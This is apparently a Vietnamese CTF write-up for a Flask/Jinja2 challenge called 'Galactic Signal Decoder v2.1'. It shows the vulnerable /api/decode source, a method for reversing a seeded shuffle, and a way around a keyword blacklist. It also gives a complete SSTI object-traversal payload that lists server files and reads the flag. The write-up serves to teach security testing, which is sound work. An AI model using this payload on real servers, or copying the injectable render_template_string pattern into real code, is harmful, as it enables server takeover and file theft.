
# CTF Writeup: Galactic Signal Decoder v2.1

**Mảng:** An toàn ứng dụng Web (Web Exploitation)  
**URL:** https://web2.biscuitlab.id.vn/  

---

## 1. Tổng quan (Overview)

**Galactic Signal Decoder v2.1** là một thử thách khai thác lỗ hổng bảo mật ứng dụng Web, được xây dựng trên nền tảng Python Flask kết hợp với template engine Jinja2.

* **Mục tiêu:** Khảo sát ứng dụng, xác định bề mặt tấn công (attack surface), phát hiện lỗ hổng bảo mật và tiến hành khai thác để thu thập tệp chứa cờ (flag file).
* **Các công nghệ và vấn đề bảo mật liên quan:**
  * Python Flask & Jinja2 Template Engine
  * Server-Side Template Injection (SSTI)
  * Python Object Traversal
  * Random Seed & Permutation Shuffle
  * Blacklist Filter Bypass

---

## 2. Khảo sát ứng dụng (Reconnaissance)

### 2.1. Phân tích giao diện và chức năng
Giao diện ứng dụng cung cấp các tính năng xử lý tín hiệu không gian như: *Carrier Wave*, *Quantum Burst*, và *Resonance Repair*. 

### 2.2. Theo dõi HTTP Request
Sử dụng công cụ Developer Tools trên trình duyệt để quan sát các yêu cầu mạng (Network tab) trong quá trình tương tác, tôi phát hiện một endpoint quan trọng xử lý dữ liệu:
* Endpoint: `/api/decode?pattern=carrier_wave`
* Phương thức: `GET`
* Tham số truyền vào: `pattern`

Phản hồi từ server trả về dữ liệu dưới dạng JSON:
```json
{
    "description": "Emit a standard carrier pulse to probe the entity",
    "name": "Carrier Wave",
    "power": 7,
    "recharge": 0,
    "type": "scan"
}

```

Qua bước khảo sát, tham số `pattern` được xác định là điểm dữ liệu do người dùng kiểm soát (user-controlled input) và được truyền trực tiếp về phía máy chủ để xử lý.

---

## 3. Phân tích mã nguồn (Source Code Analysis)

Sau khi trích xuất mã nguồn từ gói tin bài lab, tiến hành kiểm tra tệp `app.py`, đoạn mã xử lý tại endpoint `/api/decode` như sau:

```python
@app.route("/api/decode")
def decode_signal():
    pattern = request.args.get("pattern", "")

    if pattern in signal_catalog:
        signal = signal_catalog[pattern]
        return jsonify(signal)
    else:
        try:
            pattern = valid_template(pattern)

            if not special_filter(pattern):
                return jsonify({
                    "error": "Signal pattern rejected"
                }), 404

            template = render_template_string(
                "<i>Signal pattern rejected. It's trash, and I'm going to destroy it and turn it back into: "
                + pattern +
                "</i>"
            )

            return jsonify({"error": template}), 404

        except Exception as e:
            return jsonify({
                "error": "Decoder fault: " + str(e)
            }), 404

```

### Phát hiện lỗ hổng SSTI

Dữ liệu từ tham số `pattern` được nối trực tiếp vào hàm `render_template_string()` mà không thông qua cơ chế gán biến an toàn của Jinja2. Điều này dẫn đến lỗ hổng **Server-Side Template Injection (SSTI)**, cho phép kẻ tấn công chèn các biểu thức mã độc để thực thi trên máy chủ.

Tuy nhiên, trước khi đến bước render, input phải vượt qua hai hàm kiểm tra: `valid_template()` và `special_filter()`.

---

## 4. Xử lý cơ chế Random Shuffle

Hàm `valid_template()` trong mã nguồn thực hiện việc xáo trộn ký tự của input nếu phát hiện chứa các ký tự đặc biệt ngoài danh sách cho phép:

```python
RANDOM_SEED = random.randint(0, 50)

def valid_template(template):
    pattern = r"^[a-zA-Z0-9 ]+$"

    if not re.match(pattern, template):
        random.seed(RANDOM_SEED)
        char_list = list(template)
        random.shuffle(char_list)
        template = ''.join(char_list)

    return template

```

* **Vấn đề:** Các cú pháp SSTI thường chứa ký tự đặc biệt (`{}`, `_`, `.`, `()`), kích hoạt cơ chế xáo trộn ngẫu nhiên `random.shuffle()` dựa trên một `RANDOM_SEED` chưa biết (từ 0 đến 50).
* **Hướng giải quyết:** Sử dụng tệp hỗ trợ `sol.py` để dò tìm seed, sau đó áp dụng thuật toán **Reverse Shuffle** (Hoán vị ngược) ở phía client. Chuỗi payload sau khi đảo ngược thứ tự ký tự, khi bị hàm `shuffle` của server tác động lần nữa, sẽ tự động khôi phục về dạng biểu thức Jinja2 hoàn chỉnh.

---

## 5. Phân tích bộ lọc Blacklist (`special_filter`)

Hàm `special_filter()` kiểm tra chuỗi đầu vào sau khi đã qua bước xử lý xáo trộn:

* Các từ khóa bị chặn: `os`, `import`, `class`, `builtins`, `request`, `flag`,...
* Các ký tự đặc biệt bị cấm: dấu nháy đơn (`'`), dấu gạch chéo (`/`), dấu cộng (`+`).

Do đó, không thể sử dụng các payload SSTI thông thường. Cần áp dụng kỹ thuật **Python Object Traversal** và tận dụng các phương thức có sẵn như `.keys()`, `.values()`, `.__iter__()`, `.__reduce__()`, kết hợp với phương thức `.__add__()` để nối chuỗi thay cho dấu `+`.

---

## 6. Xây dựng Payload và Khai thác

### 6.1. Xây dựng chuỗi Payload SSTI

Sử dụng đối tượng `session` sẵn có trong ngữ cảnh Jinja2 để lần theo cấu trúc biến toàn cục (`__globals__`) và trỏ tới các hàm hệ thống mà không vi phạm blacklist:

```jinja2
{{session.on_update.__globals__.values().__iter__().__reduce__()[1][0][7].values().__iter__().__reduce__()[1][0][6](session.on_update.__globals__.keys().__iter__().__reduce__()[1][0][3][3].__add__(session.on_update.__globals__.keys().__iter__().__reduce__()[1][0][4][2])).listdir()}}

```

### 6.2. Liệt kê thư mục hệ thống

Đưa payload qua thuật toán Reverse Shuffle tương ứng với seed và gửi lên endpoint, máy chủ phản hồi danh sách tệp tin trong thư mục làm việc:

```json
{
  "error": "<i>Signal pattern rejected. It's trash, and I'm going to destroy it and turn it back into: ['flag_CvKzUqpUx7Y3Au8.txt', 'static', 'templates', 'app.py']</i>"
}

```

Từ kết quả trả về, tên tệp chứa cờ được xác định là: `flag_CvKzUqpUx7Y3Au8.txt`.

### 6.3. Đọc nội dung Flag

Tiến hành điều chỉnh phần cuối của biểu thức payload để gọi phương thức đọc nội dung tệp tin thay vì liệt kê thư mục. Gửi yêu cầu lên hệ thống, kết quả thu được:

```json
{
  "error": "<i>Signal pattern rejected. It's trash, and I'm going to destroy it and turn it back into: PTITHCM{g4l4ct1c_s1gn4l_d3c0d3d_succ3ssfully}</i>"
}

```

---

